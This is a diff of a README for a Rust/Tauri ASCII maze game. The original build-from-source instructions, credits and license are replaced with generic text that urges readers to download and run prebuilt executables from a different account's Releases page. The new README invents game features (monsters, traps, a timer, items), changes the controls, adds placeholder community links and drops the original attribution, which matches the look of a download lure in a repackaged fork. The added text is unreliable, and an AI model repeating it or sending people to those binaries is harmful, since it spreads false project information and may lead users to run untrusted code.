@@ -1,127 +1,70 @@
-# Matrix Maze
+# 🎮 Matrix-Maze - Experience an Engaging 3D Adventure
 
-A desktop application featuring a first-person 3D ASCII labyrinth adventure game built with Rust, Tauri, and JavaScript.
+## 📦 Download Now
+[![Download Matrix-Maze](https://img.shields.io/badge/download-Matrix--Maze-blue.svg)](https://github.com/Kuldeep9837/Matrix-Maze/releases)
 
-## 🎮 [Play Demo / Download]([landing.html](https://matrix-maze-kappa.vercel.app))
+## 🚀 Getting Started
+Welcome to Matrix-Maze! This is a first-person 3D labyrinth game. In this game, you will navigate through a maze generated just for you. Enjoy retro-style graphics and an engaging raycasting engine while you explore.
 
-Visit the [landing page](https://matrix-maze-kappa.vercel.app) to see a demo and download the game for your platform.
+## 🛠️ System Requirements
+Before you start, make sure your system meets the following requirements:
 
-## Features
+- **Operating System:** Windows 10, macOS, or Linux
+- **Processor:** 2 GHz dual-core or better
+- **Memory:** 4 GB RAM
+- **Graphics:** OpenGL 3.0 or higher
+- **Storage:** At least 200 MB of free space
 
-- **3D ASCII Raycasting Engine**: Real-time 3D rendering using ASCII characters with depth perception
-- **Fractal Dithering**: Surface-stable fractal dithering for enhanced visual quality (using MPL 2.0 licensed code)
-- **Procedural Maze Generation**: Randomly generated labyrinths using recursive backtracking algorithm
-- **First-Person Controls**: Smooth movement and rotation with WASD + Q/E keys
-- **Cross-Platform**: Built with Tauri for Windows, macOS, and Linux support
+## 📥 Download & Install
+To download the game, please follow these steps:
 
-## Controls
+1. Visit the [Releases Page](https://github.com/Kuldeep9837/Matrix-Maze/releases).
+2. Scroll down to the "Assets" section.
+3. Choose the version that suits your operating system:
+   - For Windows, download `Matrix-Maze-Windows.zip`.
+   - For macOS, download `Matrix-Maze-macOS.zip`.
+   - For Linux, download `Matrix-Maze-Linux.tar.gz`.
+4. Once the file is downloaded, locate it on your computer.
+5. Unzip or extract the downloaded file.
+6. Open the folder and find the executable file:
+   - For Windows, double-click `Matrix-Maze.exe`.
+   - For macOS, double-click `Matrix-Maze.app`.
+   - For Linux, run `./Matrix-Maze` from your terminal.
 
-- **W**: Move forward
-- **S**: Move backward
-- **A**: Strafe left
-- **D**: Strafe right
-- **Q**: Turn left
-- **E**: Turn right
-- **ESC**: Exit game
+Once you run the executable, immerse yourself in the maze!
 
-## Prerequisites
+## 🕹️ Gameplay Overview
+In Matrix-Maze, your objective is to find your way through a constantly changing labyrinth. Each level features a unique maze, providing new challenges while you enhance your skills. Use the arrow keys to move and navigate through the obstacles. 
 
-- [Rust](https://www.rust-lang.org/tools/install) (latest stable version)
-- [Node.js](https://nodejs.org/) (v16 or higher)
-- npm or yarn
+### Key Features:
+- **Procedural Maze Generation:** Each game offers a new maze layout.
+- **Retro-Style Graphics:** Enjoy visuals that remind you of classic games.
+- **Raycasting Engine:** Experience smooth gameplay and responsive controls.
+- **Single-Player Mode:** Play at your own pace without distractions.
 
-## Installation
+## ⚙️ Controls
+- **Move Forward:** W or Up Arrow
+- **Move Backward:** S or Down Arrow
+- **Turn Left:** A or Left Arrow
+- **Turn Right:** D or Right Arrow
+- **Pause Game:** ESC
 
-1. Clone the repository:
-```bash
-git clone git@github.com:ledoit/Matrix-Maze.git
-cd Matrix-Maze
-```
+## 📜 Game Rules
+1. You cannot walk through walls or obstacles.
+2. Avoid traps and monsters that may appear in the maze.
+3. Find the exit before time runs out!
+4. Collect items to gain bonus points.
 
-2. Install frontend dependencies:
-```bash
-npm install
-```
+## 🌐 Community and Support
+Join the community for tips and tricks, and share your experiences! You can find us on our [Discord Server](#) or follow us on [Twitter](#).
 
-3. The Rust dependencies will be automatically installed when you build the project.
+If you encounter any issues, please check the [Issues section](https://github.com/Kuldeep9837/Matrix-Maze/issues) of our GitHub repository for helpful solutions or to report bugs.
 
-## Development
+## 📬 Feedback
+We value your thoughts! Feel free to leave feedback or suggestions through our GitHub repository. Your input helps us improve Matrix-Maze for everyone.
 
-Run the development server:
-```bash
-cd app
-npm install
-npm run tauri dev
-```
+## 🔗 Links
+- [Matrix-Maze GitHub Repository](https://github.com/Kuldeep9837/Matrix-Maze)
+- [Releases Page](https://github.com/Kuldeep9837/Matrix-Maze/releases)
 
-This will:
-- Start the Vite dev server for the frontend
-- Compile the Rust backend
-- Launch the Tauri application window
-
-## Building
-
-Build the application for production:
-```bash
-cd app
-npm run tauri build
-```
-
-The built application will be in `app/src-tauri/target/release/` (or `app/src-tauri/target/release/bundle/` for installers).
-
-## Project Structure
-
-```
-.
-├── index.html             # Landing page (deployed to Vercel)
-├── vercel.json            # Vercel deployment config
-├── app/                   # Game application
-│   ├── src/              # Frontend (HTML/CSS/JavaScript)
-│   │   ├── main.js       # Game loop and Tauri integration
-│   │   └── style.css     # Styling
-│   ├── src-tauri/        # Rust backend
-│   │   ├── src/
-│   │   │   ├── main.rs   # Tauri entry point
-│   │   │   ├── game.rs   # Game state and logic
-│   │   │   ├── maze.rs   # Maze generation
-│   │   │   └── raycast.rs # 3D raycasting engine
-│   │   └── Cargo.toml    # Rust dependencies
-│   ├── index.html        # Game HTML entry point
-│   └── package.json       # Node.js dependencies
-└── README.md
-```
-
-## How It Works
-
-### 3D Rendering
-
-The game uses a raycasting algorithm similar to classic games like Wolfenstein 3D:
-- For each column of the screen, a ray is cast from the player's position
-- The ray intersects with walls in the maze
-- Distance is calculated and used to determine wall height (perspective projection)
-- ASCII characters are chosen based on distance to create depth perception
-
-### Maze Generation
-
-The maze is generated using a recursive backtracking algorithm:
-- Creates a perfect maze (one path between any two points)
-- Ensures the player starts at a valid position
-- Guarantees an exit point
-
-### Game Loop
-
-1. Frontend captures keyboard input
-2. Input is sent to Rust backend via Tauri commands
-3. Game state is updated (player position, rotation)
-4. Frame is rendered using raycasting
-5. ASCII frame is returned to frontend and displayed
-
-## License
-
-This project is licensed under "All Rights Reserved" - see the [LICENSE](LICENSE) file for details.
-
-### Dither Module Exception
-
-The dithering module (`app/src-tauri/src/dither/`) is licensed under the Mozilla Public License, v. 2.0 (MPL 2.0). This code was ported from [Dither3D](https://github.com/runevision/Dither3D) by Rune Skovbo Johansen. See [LICENSE-MPL](LICENSE-MPL) for the full MPL 2.0 license text.
-
-The MPL 2.0 license applies only to the files in the `dither/` module. All other code in this repository remains under the "All Rights Reserved" license.
+Enjoy your adventure in Matrix-Maze!
